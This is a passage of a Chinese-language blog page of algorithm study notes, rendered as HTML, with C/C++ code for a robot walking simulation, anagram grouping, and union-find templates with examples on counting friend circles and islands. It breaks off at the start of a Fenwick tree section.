未找到匹配项</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n, target;<br>    cin &gt;&gt; n &gt;&gt; target;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        cin &gt;&gt; nums[i];<br>    &#125;<br>    <span class="hljs-built_in">twoSum</span>(n, target);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="模拟行走机器人"><a href="#模拟行走机器人" class="headerlink" title="模拟行走机器人"></a>模拟行走机器人</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> dirs[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;; <span class="hljs-comment">// 方向数组</span><br><span class="hljs-built_in">unordered_set</span>&lt;<span class="hljs-type">int</span>&gt; s;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> x * <span class="hljs-number">60010</span> + y; <span class="hljs-comment">// 映射函数</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">robotSim</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> commands[], <span class="hljs-type">int</span> obstacles[][<span class="hljs-number">2</span>])</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        s.insert(f(obstacles[i][<span class="hljs-number">0</span>], obstacles[i][<span class="hljs-number">1</span>]));<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>, ans = <span class="hljs-number">0</span>, k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-type">int</span> c = commands[i];<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-2</span>) &#123;<br>            k = (k + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>; <span class="hljs-comment">// 左转</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-1</span>) &#123;<br>            k = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>; <span class="hljs-comment">// 右转</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">while</span> (c-- &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">int</span> nx = x + dirs[k], ny = y + dirs[k + <span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span> (s.count(f(nx, ny))) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 遇到障碍物</span><br>                x = nx;<br>                y = ny;<br>                ans = max(ans, x * x + y * y);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-type">int</span> commands[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <span class="hljs-built_in">cin</span> &gt;&gt; commands[i];<br>    <span class="hljs-type">int</span> obstacles[m][<span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) <span class="hljs-built_in">cin</span> &gt;&gt; obstacles[i][<span class="hljs-number">0</span>] &gt;&gt; obstacles[i][<span class="hljs-number">1</span>];<br>    <br>    <span class="hljs-built_in">cout</span> &lt;&lt; robotSim(n, m, commands, obstacles) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="字母异位词分组"><a href="#字母异位词分组" class="headerlink" title="字母异位词分组"></a>字母异位词分组</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt; groupAnagrams(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&amp; strs) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt; h;  <span class="hljs-comment">// 哈希表，键是排序后的字符串</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; str : strs) &#123;<br>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> key = str;<br>            <span class="hljs-built_in">std</span>::sort(key.begin(), key.end());  <span class="hljs-comment">// 将字符串排序</span><br>            h[key].push_back(str);  <span class="hljs-comment">// 将原始字符串加入哈希表</span><br>        &#125;<br>        <br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt; result;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; p : h) &#123;<br>            result.push_back(p.second);  <span class="hljs-comment">// 收集结果</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>++++</p><h2 id="十一-并查集"><a href="#十一-并查集" class="headerlink" title="十一.并查集"></a>十一.并查集</h2><p>1.返回两个集合是否相同：查上游是否是一个节点，最后一个节点指向自己</p><p>2.取并集：小挂大上</p><h3 id="朴素并查集"><a href="#朴素并查集" class="headerlink" title="朴素并查集"></a>朴素并查集</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">4 5</span><br><span class="hljs-comment">U 1 2 将节点 1 和 2 合并到同一个集合</span><br><span class="hljs-comment">U 3 4</span><br><span class="hljs-comment">F 1 3</span><br><span class="hljs-comment">U 2 3</span><br><span class="hljs-comment">F 1 3</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;  <span class="hljs-comment">// 假设节点数的最大值</span><br><span class="hljs-type">int</span> p[N];  <span class="hljs-comment">// 存储每个点的祖宗节点</span><br><br><span class="hljs-comment">// 返回x的大祖宗节点</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) &#123; <span class="hljs-comment">//自己不是祖宗</span><br>        p[x] = find(p[x]);  <span class="hljs-comment">// 路径压缩，向上找祖宗</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;  <span class="hljs-comment">// n:节点数, m:操作数</span><br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br><br>    <span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        p[i] = i;  <span class="hljs-comment">// 每个节点的祖宗节点是自己</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (m--) &#123;<br>        <span class="hljs-type">char</span> op;  <span class="hljs-comment">// 操作类型，&#x27;U&#x27; 表示 Union，&#x27;F&#x27; 表示 Find</span><br>        <span class="hljs-type">int</span> a, b;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; op &gt;&gt; a &gt;&gt; b;<br><br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;U&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 合并操作</span><br>            p[find(a)] = find(b); <span class="hljs-comment">//a的大祖宗的上一个祖宗变成b的大祖宗，p[]指上一个祖宗</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-string">&#x27;F&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 查询操作，输出a和b是否属于同一个集合</span><br>            <span class="hljs-keyword">if</span> (find(a) == find(b)) &#123;<br>                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;YES&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// a 和 b 在同一集合</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;NO&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// a 和 b 不在同一集合</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="维护size的并查集："><a href="#维护size的并查集：" class="headerlink" title="维护size的并查集："></a>维护size的并查集：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">//  p = [2, 2, 3, 4, 5]   // 1 挂到 2 下  size = [1, 2, 1, 1, 1] // 2 变成祖宗，大小变为 2</span><br><br><br><br><span class="hljs-type">int</span> p[N], size[N];<span class="hljs-comment">//以i为节点的家庭有多少人（包括自己）</span><br>    <span class="hljs-comment">//p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量</span><br>    <span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    size[i] = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>p[find(a)] = find(b);<br>size[b] += size[a];<br></code></pre></td></tr></table></figure><h3 id="维护到祖宗节点距离的并查集："><a href="#维护到祖宗节点距离的并查集：" class="headerlink" title="维护到祖宗节点距离的并查集："></a>维护到祖宗节点距离的并查集：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//p = [2, 2, 3, 4, 5]   // 1 → 2   d = [3, 0, 0, 0, 0]   // d[1] = 3（1 到 2 的偏移量）</span><br><br><span class="hljs-type">int</span> p[N], d[N];<br>    <span class="hljs-comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离 x到上个祖宗的距离</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x)<br>    &#123;<br>        <span class="hljs-type">int</span> u = find(p[x]);<br>        d[x] += d[p[x]];<br>        p[x] = u;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    d[I] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>p[find(a)] = find(b);<br>d[find(a)] = distance; <span class="hljs-comment">// 根据具体问题，初始化find(a)的偏移量</span><br></code></pre></td></tr></table></figure><h3 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h3><h4 id="朋友圈问题"><a href="#朋友圈问题" class="headerlink" title="朋友圈问题"></a>朋友圈问题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">205</span>; <span class="hljs-comment">// 假设最多有 200 个城市</span><br><span class="hljs-type">int</span> p[N]; <span class="hljs-comment">// 记录每个城市的祖宗节点</span><br><span class="hljs-comment">// 查找 x 的祖宗节点（带路径压缩）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]); <span class="hljs-comment">// 让 x 直接指向根，优化查询速度</span><br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 合并 a 和 b 所在的集合</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">unite</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>    p[find(a)] = find(b); <span class="hljs-comment">// 让 a 的祖宗指向 b 的祖宗，合并两个集合</span><br>&#125;<br><span class="hljs-comment">// 计算省份数量</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">findCircleNum</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; isConnected)</span> &#123;<br>    <span class="hljs-type">int</span> n = isConnected.size(); <span class="hljs-comment">// 城市数量</span><br>    <span class="hljs-comment">// 初始化并查集，每个城市的祖宗是自己</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) p[i] = i;<br>    <span class="hljs-comment">// 遍历上三角矩阵，合并相连的城市</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">if</span> (isConnected[i][j]) &#123;<br>                unite(i, j); <span class="hljs-comment">// 直接连接的城市合并到同一集合</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 统计不同的祖宗节点数量</span><br>    <span class="hljs-built_in">unordered_set</span>&lt;<span class="hljs-type">int</span>&gt; provinces;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        provinces.insert(find(i)); <span class="hljs-comment">// 找到 i 的祖宗节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> provinces.size(); <span class="hljs-comment">// 祖宗节点的个数就是省份数</span><br>&#125;<br><br><span class="hljs-comment">// 主函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; isConnected = &#123;<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; findCircleNum(isConnected) &lt;&lt; <span class="hljs-built_in">endl</span>; <span class="hljs-comment">// 输出省份数量</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="岛屿问题"><a href="#岛屿问题" class="headerlink" title="岛屿问题"></a>岛屿问题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> p[N], size[N];  <span class="hljs-comment">// p[] 记录父节点, size[] 记录集合大小</span><br><span class="hljs-type">int</span> count;  <span class="hljs-comment">// 记录当前岛屿数量</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);  <span class="hljs-comment">// 路径压缩</span><br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unite</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> fx = find(x), fy = find(y);<br>    <span class="hljs-keyword">if</span> (fx != fy) &#123;<br>        p[fx] = fy;<br>        count--;  <span class="hljs-comment">// 合并后岛屿数减少</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">numIslands</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> &#123;<br>    <span class="hljs-keyword">if</span> (grid.empty()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> rows = grid.size(), cols = grid[<span class="hljs-number">0</span>].size();<br>    count = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 初始化并查集</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows * cols; i++) p[i] = i;<br>    <span class="hljs-comment">// 遍历矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; cols; j++) &#123;<br>            <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                count++;  <span class="hljs-comment">// 发现一个新的岛屿</span><br>                <span class="hljs-type">int</span> idx = i * cols + j;<br>                <span class="hljs-comment">// 向右合并</span><br>                <span class="hljs-keyword">if</span> (j + <span class="hljs-number">1</span> &lt; cols &amp;&amp; grid[i][j + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>) unite(idx, idx + <span class="hljs-number">1</span>);<br>                <span class="hljs-comment">// 向下合并</span><br>                <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; rows &amp;&amp; grid[i + <span class="hljs-number">1</span>][j] == <span class="hljs-string">&#x27;1&#x27;</span>) unite(idx, idx + cols);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&gt; grid = &#123;<br>        &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;,<br>        &#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>&#125;<br>    &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; numIslands(grid) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出 1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="十二-树状数组"><a href="#十二-树状数组" class="headerlink" title="十二.树状数组"></a>十二.树状数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 